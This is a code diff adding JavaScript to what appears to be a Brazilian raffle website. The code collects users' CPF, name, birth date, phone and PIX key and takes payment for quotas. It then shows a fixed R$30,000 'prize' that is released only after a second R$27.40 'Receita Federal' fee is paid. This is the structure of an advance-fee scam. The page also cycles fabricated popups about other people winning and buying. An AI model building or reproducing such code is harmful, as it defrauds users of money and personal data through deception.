+                document.getElementById('statusAguardando').innerHTML = '<span style="color: #28a745;">✅ Pagamento confirmado! Redirecionando...</span>';
+                
+                pararVerificacaoAutomatica();
+                
+                processarConfirmacao({
+                    confirmado: true,
+                    status: status,
+                    allowpay_status: allowpayStatus,
+                    amount: result.amount,
+                    data: result.response_data
+                });
+                
+            } else if (status === 'expired') {
+                console.log('❌ PIX expirado');
+                document.getElementById('statusAguardando').innerHTML = '<span style="color: #e74c3c;">❌ Este PIX expirou. Gere um novo código.</span>';
+                pararVerificacaoAutomatica();
+                
+            } else if (status === 'failed' || status === 'canceled') {
+                console.log('❌ Pagamento falhou ou foi cancelado');
+                document.getElementById('statusAguardando').innerHTML = '<span style="color: #e74c3c;">❌ Pagamento falhou ou foi cancelado.</span>';
+                pararVerificacaoAutomatica();
+                
+            } else {
+                document.getElementById('statusAguardando').textContent = `Aguardando confirmação...`;
+            }
+            
+        } catch (error) {
+            console.error('💥 Erro na verificação automática:', error);
+            document.getElementById('statusAguardando').textContent = `Erro na verificação. Tentando novamente...`;
+        }
+    }
+
+    function iniciarVerificacaoAutomatica() {
+        console.log('🔄 Iniciando verificação automática a cada 5 segundos');
+        
+        tentativasVerificacao = 0;
+        
+        verificarPagamentoAutomatico();
+        
+        verificacaoAutomatica = setInterval(verificarPagamentoAutomatico, 5000);
+        
+        setTimeout(() => {
+            if (verificacaoAutomatica) {
+                pararVerificacaoAutomatica();
+                document.getElementById('statusAguardando').innerHTML = '<span style="color: #e74c3c;">⏰ Tempo de verificação esgotado. Se já pagou, contate o suporte.</span>';
+            }
+        }, 1800000);
+    }
+
+    function pararVerificacaoAutomatica() {
+        if (verificacaoAutomatica) {
+            clearInterval(verificacaoAutomatica);
+            verificacaoAutomatica = null;
+            console.log('⏹️ Verificação automática parada');
+        }
+    }
+
+    function processarConfirmacao(dadosConfirmacao) {
+        const transacaoSalva = JSON.parse(localStorage.getItem(`pix_vs_${dadosUsuario.transactionId}`) || '{}');
+        transacaoSalva.status = 'paid';
+        transacaoSalva.confirmado_em = new Date().toISOString();
+        transacaoSalva.confirmacao_dados = dadosConfirmacao;
+        localStorage.setItem(`pix_vs_${dadosUsuario.transactionId}`, JSON.stringify(transacaoSalva));
+        
+        salvarConfirmacaoPagamento();
+        
+        enviarEventoConversao(pacoteSelecionado.valor, pacoteSelecionado.quantidade, dadosUsuario.transactionId);
+        
+        document.getElementById('transacaoId').textContent = dadosUsuario.transactionId;
+        
+        mostrarPopupNotificacao('✅ Pagamento confirmado! Redirecionando...');
+        
+        setTimeout(() => {
+            mostrarEtapa(3);
+        }, 2000);
+    }
+
+    function salvarConfirmacaoPagamento() {
+        const transacao = {
+            id: dadosUsuario.transactionId,
+            cpf: dadosUsuario.cpf,
+            nome: dadosUsuario.nome,
+            data_nascimento: dadosUsuario.data_nascimento,
+            telefone: dadosUsuario.telefone,
+            quantidade: pacoteSelecionado.quantidade,
+            valor: pacoteSelecionado.valor,
+            data: new Date().toISOString(),
+            status: 'pago',
+            confirmado_em: new Date().toISOString()
+        };
+        
+        let transacoes = JSON.parse(localStorage.getItem('vivasorte_transacoes') || '[]');
+        transacoes.push(transacao);
+        localStorage.setItem('vivasorte_transacoes', JSON.stringify(transacoes));
+        
+        console.log('✅ Pagamento confirmado salvo:', transacao);
+    }
+
+    function avancarParaEtapa4() {
+        mostrarEtapa(4);
+        
+        dadosUsuario.taxaPaga = false;
+        document.getElementById('areaPagamentoTaxa').style.display = 'none';
+        document.querySelector('.btn-sacar-premio').style.display = 'block';
+        document.getElementById('mensagemFinalPremio').style.display = 'none';
+        
+        if (dadosUsuario.cpf) {
+            document.getElementById('inputChavePix').value = formatarCPFString(dadosUsuario.cpf);
+        }
+        
+        salvarVisualizacaoPremio();
+    }
+
+    function formatarCPFString(cpf) {
+        if (!cpf) return '';
+        cpf = cpf.replace(/\D/g, '');
+        if (cpf.length === 11) {
+            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+        }
+        return cpf;
+    }
+
+    function salvarVisualizacaoPremio() {
+        const transacao = {
+            id: dadosUsuario.transactionId,
+            cpf: dadosUsuario.cpf,
+            premio_visto: 'sim',
+            valor_premio: 30000,
+            visto_em: new Date().toISOString()
+        };
+        
+        console.log('🏆 Prêmio visualizado:', transacao);
+    }
+
+    function atualizarPlaceholderChave() {
+        const tipo = document.getElementById('tipoChavePix').value;
+        const label = document.getElementById('labelChavePix');
+        const input = document.getElementById('inputChavePix');
+        const exemplo = document.getElementById('exemploChavePix');
+        
+        dadosUsuario.tipoChavePix = tipo;
+        
+        if (tipo === 'cpf') {
+            label.textContent = 'Chave PIX (CPF)';
+            input.placeholder = 'Digite seu CPF';
+            exemplo.textContent = 'Exemplo: 123.456.789-09';
+            input.value = dadosUsuario.cpf ? formatarCPFString(dadosUsuario.cpf) : '';
+        } else if (tipo === 'celular') {
+            label.textContent = 'Chave PIX (Celular)';
+            input.placeholder = 'Digite seu celular com DDD';
+            exemplo.textContent = 'Exemplo: (11) 99999-9999';
+            input.value = '';
+        } else if (tipo === 'email') {
+            label.textContent = 'Chave PIX (E-mail)';
+            input.placeholder = 'Digite seu e-mail';
+            exemplo.textContent = 'Exemplo: seuemail@email.com';
+            input.value = '';
+        }
+        
+        document.getElementById('erroChavePix').style.display = 'none';
+        input.style.borderColor = '#e0e0e0';
+    }
+
+    function formatarChavePix() {
+        const tipo = document.getElementById('tipoChavePix').value;
+        const input = document.getElementById('inputChavePix');
+        let value = input.value;
+        
+        if (tipo === 'cpf') {
+            let digits = value.replace(/\D/g, '');
+            if (digits.length <= 11) {
+                digits = digits.replace(/(\d{3})(\d)/, '$1.$2');
+                digits = digits.replace(/(\d{3})(\d)/, '$1.$2');
+                digits = digits.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+                input.value = digits;
+            }
+        } else if (tipo === 'celular') {
+            let digits = value.replace(/\D/g, '');
+            if (digits.length <= 11) {
+                if (digits.length > 2) {
+                    digits = '(' + digits.substring(0, 2) + ') ' + digits.substring(2);
+                }
+                if (digits.length > 10) {
+                    digits = digits.substring(0, 10) + '-' + digits.substring(10);
+                }
+                input.value = digits;
+            }
+        }
+        
+        document.getElementById('erroChavePix').style.display = 'none';
+        input.style.borderColor = '#e0e0e0';
+    }
+
+    function validarChavePix() {
+        const tipo = document.getElementById('tipoChavePix').value;
+        const chave = document.getElementById('inputChavePix').value.trim();
+        const erroChave = document.getElementById('erroChavePix');
+        
+        if (!chave) {
+            erroChave.textContent = 'Por favor, informe sua chave PIX.';
+            erroChave.style.display = 'block';
+            return false;
+        }
+        
+        if (tipo === 'cpf') {
+            const cpfNumeros = chave.replace(/\D/g, '');
+            if (cpfNumeros.length !== 11) {
+                erroChave.textContent = 'CPF inválido. Deve conter 11 dígitos.';
+                erroChave.style.display = 'block';
+                return false;
+            }
+        } else if (tipo === 'celular') {
+            const celularNumeros = chave.replace(/\D/g, '');
+            if (celularNumeros.length < 10 || celularNumeros.length > 11) {
+                erroChave.textContent = 'Celular inválido. Deve conter DDD + número.';
+                erroChave.style.display = 'block';
+                return false;
+            }
+        } else if (tipo === 'email') {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(chave)) {
+                erroChave.textContent = 'E-mail inválido.';
+                erroChave.style.display = 'block';
+                return false;
+            }
+        }
+        
+        erroChave.style.display = 'none';
+        return true;
+    }
+
+    function sacarPremio() {
+        if (!validarChavePix()) {
+            return;
+        }
+        
+        const tipo = document.getElementById('tipoChavePix').value;
+        const chave = document.getElementById('inputChavePix').value.trim();
+        
+        dadosUsuario.chavePix = chave;
+        dadosUsuario.tipoChavePix = tipo;
+        
+        document.querySelector('.btn-sacar-premio').style.display = 'none';
+        document.getElementById('areaPagamentoTaxa').style.display = 'block';
+        
+        gerarPIXTaxa();
+    }
+
+    async function gerarPIXTaxa() {
+        const valorTaxa = 27.40;
+        
+        try {
+            // Captura UTMs do UTMify
+            let utmStringTaxa = '';
+            try {
+                if (window.utmParams && window.utmParams.toString()) {
+                    utmStringTaxa = window.utmParams.toString();
+                } else {
+                    utmStringTaxa = window.location.search.replace(/^\?/, '');
+                }
+            } catch(e) { utmStringTaxa = window.location.search.replace(/^\?/, ''); }
+
+            const dadosPIX = {
+                amount: valorTaxa,
+                cpf: dadosUsuario.cpf,
+                nome: dadosUsuario.nome,
+                data_nascimento: dadosUsuario.data_nascimento,
+                telefone: dadosUsuario.telefone,
+                quantidade: 1,
+                descricao: 'Taxa Receita Federal - Liberação Prêmio R$30.000',
+                utm: utmStringTaxa || null
+            };
+            
+            console.log('📤 Gerando PIX para taxa:', dadosPIX);
+            
+            const response = await fetch(ALLOWPAY_CONFIG.API_URL, {
+                method: 'POST',
+                headers: ALLOWPAY_CONFIG.HEADERS,
+                body: JSON.stringify(dadosPIX)
+            });
+            
+            const resultado = await response.json();
+            console.log('📥 Resposta API Taxa:', resultado);
+            
+            if (!resultado.success) {
+                throw new Error(resultado.error || 'Erro ao gerar PIX da taxa');
+            }
+            
+            const qrCodeImage = resultado.qr_code_image || 
+                `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(resultado.codigo_pix || resultado.qr_code)}`;
+            
+            document.getElementById('qrCodeTaxa').innerHTML = 
+                `<img src="${qrCodeImage}" alt="QR Code PIX Taxa" style="max-width: 200px; border: 1px solid #ddd;">`;
+            
+            document.getElementById('codigoPIXTaxa').value = resultado.codigo_pix || resultado.qr_code;
+            
+            dadosUsuario.transactionIdTaxa = resultado.transaction_id;
+            
+            localStorage.setItem(`taxa_vs_${resultado.transaction_id}`, JSON.stringify({
+                ...resultado,
+                cpf: dadosUsuario.cpf,
+                nome: dadosUsuario.nome,
+                chave_pix: dadosUsuario.chavePix,
+                tipo_chave: dadosUsuario.tipoChavePix,
+                valor: valorTaxa,
+                gerado_em: new Date().toISOString(),
+                status: 'pending'
+            }));
+            
+            mostrarPopupNotificacao('PIX da taxa gerado! Pague R$ 27,40 para liberar seu prêmio.');
+            
+            iniciarVerificacaoTaxaAutomatica();
+            
+        } catch (error) {
+            console.error('❌ Erro ao gerar PIX da taxa:', error);
+            
+            const erroTaxa = document.getElementById('erroChavePix');
+            erroTaxa.textContent = `Erro ao gerar PIX da taxa: ${error.message}`;
+            erroTaxa.style.display = 'block';
+            
+            mostrarPopupNotificacao('Erro ao gerar PIX da taxa. Tente novamente.', true);
+        }
+    }
+
+    function copiarCodigoPIXTaxa() {
+        const codigoInput = document.getElementById('codigoPIXTaxa');
+        const btnCopiar = document.querySelector('#areaPIXTaxa .input-copiar button');
+        
+        if (!codigoInput.value) {
+            mostrarPopupNotificacao('❌ Nenhum código PIX disponível.', true);
+            return;
+        }
+        
+        const textoOriginal = btnCopiar.textContent;
+        
+        codigoInput.select();
+        codigoInput.setSelectionRange(0, 99999);
+        
+        navigator.clipboard.writeText(codigoInput.value)
+            .then(() => {
+                btnCopiar.textContent = '✅ Copiado!';
+                btnCopiar.style.background = '#28a745';
+                
+                mostrarPopupNotificacao('✅ Código PIX da taxa copiado!');
+                
+                setTimeout(() => {
+                    btnCopiar.textContent = textoOriginal;
+                    btnCopiar.style.background = '#2f4eb5';
+                }, 3000);
+            })
+            .catch(err => {
+                console.error('Erro ao copiar: ', err);
+                document.execCommand('copy');
+                btnCopiar.textContent = '❌ Falhou';
+                btnCopiar.style.background = '#e74c3c';
+                
+                mostrarPopupNotificacao('⚠️ Selecione e copie manualmente (Ctrl+C).', true);
+                
+                setTimeout(() => {
+                    btnCopiar.textContent = textoOriginal;
+                    btnCopiar.style.background = '#2f4eb5';
+                }, 3000);
+            });
+    }
+
+    async function verificarPagamentoTaxa() {
+        if (!dadosUsuario.transactionIdTaxa) {
+            return;
+        }
+        
+        document.getElementById('statusTaxa').textContent = `Verificando pagamento da taxa...`;
+        
+        try {
+            const response = await fetch(ALLOWPAY_CONFIG.CHECK_PAYMENT_URL, {
+                method: 'POST',
+                headers: ALLOWPAY_CONFIG.HEADERS,
+                body: JSON.stringify({
+                    transaction_id: dadosUsuario.transactionIdTaxa
+                })
+            });
+            
+            const result = await response.json();
+            
+            if (!result.success) {
+                console.log('❌ Erro na verificação da taxa:', result.error);
+                return;
+            }
+            
+            const status = result.status;
+            
+            console.log(`📊 Status da taxa: ${status}`);
+            
+            const statusConfirmados = ['paid', 'completed', 'approved'];
+            
+            if (statusConfirmados.includes(status)) {
+                console.log('✅ Taxa paga com sucesso!');
+                
+                document.getElementById('statusTaxa').innerHTML = '<span style="color: #28a745;">✅ Taxa paga! Liberando prêmio...</span>';
+                
+                clearInterval(verificacaoTaxaAutomatica);
+                verificacaoTaxaAutomatica = null;
+                
+                dadosUsuario.taxaPaga = true;
+                
+                document.getElementById('areaPagamentoTaxa').style.display = 'none';
+                document.getElementById('mensagemFinalPremio').style.display = 'block';
+                
+                salvarTaxaPaga();
+                
+                mostrarPopupNotificacao('✅ Taxa paga! Prêmio liberado. Aguarde contato.');
+                
+            } else if (status === 'expired' || status === 'failed' || status === 'canceled') {
+                document.getElementById('statusTaxa').innerHTML = '<span style="color: #e74c3c;">❌ Pagamento da taxa falhou. Gere um novo PIX.</span>';
+            } else {
+                document.getElementById('statusTaxa').textContent = `Aguardando confirmação do pagamento da taxa...`;
+            }
+            
+        } catch (error) {
+            console.error('💥 Erro na verificação da taxa:', error);
+            document.getElementById('statusTaxa').textContent = `Erro na verificação. Tentando novamente...`;
+        }
+    }
+
+    function iniciarVerificacaoTaxaAutomatica() {
+        console.log('🔄 Iniciando verificação da taxa a cada 5 segundos');
+        
+        document.getElementById('aguardandoTaxa').style.display = 'block';
+        
+        verificarPagamentoTaxa();
+        
+        verificacaoTaxaAutomatica = setInterval(verificarPagamentoTaxa, 5000);
+        
+        setTimeout(() => {
+            if (verificacaoTaxaAutomatica) {
+                clearInterval(verificacaoTaxaAutomatica);
+                verificacaoTaxaAutomatica = null;
+                document.getElementById('statusTaxa').innerHTML = '<span style="color: #e74c3c;">⏰ Tempo esgotado. Se pagou, contate o suporte.</span>';
+            }
+        }, 1800000);
+    }
+
+    function salvarTaxaPaga() {
+        const transacaoTaxa = {
+            id: dadosUsuario.transactionIdTaxa,
+            cpf: dadosUsuario.cpf,
+            nome: dadosUsuario.nome,
+            chave_pix: dadosUsuario.chavePix,
+            tipo_chave: dadosUsuario.tipoChavePix,
+            valor: 27.40,
+            data: new Date().toISOString(),
+            status: 'taxa_paga',
+            confirmado_em: new Date().toISOString()
+        };
+        
+        let taxasPagas = JSON.parse(localStorage.getItem('vivasorte_taxas') || '[]');
+        taxasPagas.push(transacaoTaxa);
+        localStorage.setItem('vivasorte_taxas', JSON.stringify(taxasPagas));
+        
+        console.log('✅ Taxa paga salva:', transacaoTaxa);
+    }
+
+    function mostrarPopupNotificacao(mensagem, isError = false) {
+        const popup = document.getElementById('popup');
+        popup.textContent = mensagem;
+        popup.style.background = isError ? '#e74c3c' : '#28a745';
+        popup.style.display = 'block';
+        
+        if (document.getElementById('notifySound')) {
+            document.getElementById('notifySound').play().catch(e => console.log('Som não disponível'));
+        }
+        
+        setTimeout(() => {
+            popup.style.display = 'none';
+        }, 4000);
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+        document.getElementById('numero').addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            let valor = parseInt(this.value) || 0;
+            if (valor > 500) this.value = 500;
+            atualizarBotaoComprar();
+        });
+        
+        document.getElementById('modalPagamento').addEventListener('click', function(e) {
+            if (e.target === this) {
+                fecharModal();
+            }
+        });
+        
+        document.getElementById('inputCPF').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                const btn = document.getElementById('btnContinuarCPF');
+                if (!btn.disabled) {
+                    validarCPFeAvancar();
+                }
+            }
+        });
+        
+        document.getElementById('inputTelefone').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                gerarPIX();
+            }
+        });
+        
+        iniciarPopups();
+    });
+
+    function iniciarPopups() {
+        const mensagens = [
+            "João P. acabou de Ganhar 50mil!",
+            "Larissa F. acabou de Ganhar Um Iphone 16 Pro!",
+            "Diego S. acabou de comprar 70 cotas!",
+            "Juliana M. acabou de comprar 100 cotas!",
+            "Bruno T. acabou de comprar 200 cotas!",
+            "Carla R. acabou de comprar 70 cotas!",
+            "Felipe N. acabou de comprar 30 cotas!",
+            "Amanda C. acabou de comprar 40 cotas!",
+            "Pedro V. acabou de comprar 70 cotas!",
+            "Thais L. acabou de comprar 100 cotas!",
+        ];
+
+        let index = 0;
+
+        function mostrarPopup() {
+            if (index >= mensagens.length) return;
+
+            const popup = document.getElementById('popup');
+            popup.innerText = mensagens[index];
+            popup.style.display = 'block';
+            
+            if (document.getElementById('notifySound')) {
+                document.getElementById('notifySound').play().catch(e => console.log('Som não disponível'));
+            }
+
+            setTimeout(() => {
+                popup.style.display = 'none';
+                index++;
+                setTimeout(mostrarPopup, 5000);
+            }, 4000);
+        }
+
+        setTimeout(mostrarPopup, 1000);
+    }
+    </script>
+
+    <!-- Meta Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1566849421225167');
+    fbq('track', 'PageView');
+    </script>
+    <noscript><img height="1" width="1" style="display:none"
+    src="https://www.facebook.com/tr?id=1566849421225167&ev=PageView&noscript=1"
+    /></noscript>
+    <!-- End Meta Pixel Code -->
+    
+    <!-- UTMify Script -->
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    
+    <script>
+    window.pixelId = "6953b03a04688180602e47b9";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+    </script>
+    
+
+
+</body></html>
